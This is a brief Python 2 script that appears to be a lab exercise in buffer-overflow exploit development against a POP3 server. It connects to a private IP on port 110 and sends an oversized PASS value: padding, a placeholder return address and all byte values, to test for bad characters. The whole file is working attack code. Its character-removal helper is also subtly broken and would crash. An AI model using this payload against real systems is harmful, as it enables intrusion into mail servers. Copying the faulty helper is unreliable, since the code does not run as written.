#!/usr/bin/python2

import socket

def remove_bad_chars(chars, omit):
    for o in omit:
        chars = chars.remove(o)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

chars = [chr(c) for c in  range(0, 256)]

remove_bad_chars(chars, ['\0', '\n', '\r'])

buffer = "A"*2606 + "\xef\xbe\xad\xde" + "".join(chars)

print "Testing 0-255 char values"
s.connect(('10.11.11.142', 110))
data = s.recv(1024)
print "Received: ", data
s.send("USER username" + "\r\n")
data = s.recv(1024)
s.send("PASS " + buffer + "\r\n")
